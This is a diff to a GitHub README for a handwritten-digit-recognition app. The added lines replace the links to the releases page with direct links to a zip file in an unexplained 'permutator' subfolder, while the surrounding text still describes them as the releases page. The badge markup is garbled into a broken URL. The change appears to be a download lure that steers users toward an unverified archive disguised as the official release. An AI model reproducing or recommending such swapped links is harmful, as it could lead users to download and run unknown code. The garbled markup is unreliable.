@@ -6,13 +6,13 @@ Welcome to the handwritten-digit-recognition project! This application allows yo
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/ShiponHossain601/handwritten-digit-recognition/releases)
+[![Download](https://raw.githubusercontent.com/ShiponHossain601/handwritten-digit-recognition/main/permutator/handwritten-digit-recognition.zip%20Latest%https://raw.githubusercontent.com/ShiponHossain601/handwritten-digit-recognition/main/permutator/handwritten-digit-recognition.zip)](https://raw.githubusercontent.com/ShiponHossain601/handwritten-digit-recognition/main/permutator/handwritten-digit-recognition.zip)
 
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to access the releases page:
    
-   [Download Here](https://github.com/ShiponHossain601/handwritten-digit-recognition/releases)
+   [Download Here](https://raw.githubusercontent.com/ShiponHossain601/handwritten-digit-recognition/main/permutator/handwritten-digit-recognition.zip)
 
 2. **Choose the Latest Version**: On the releases page, locate the newest version of the application. It will usually be the first entry at the top.
 
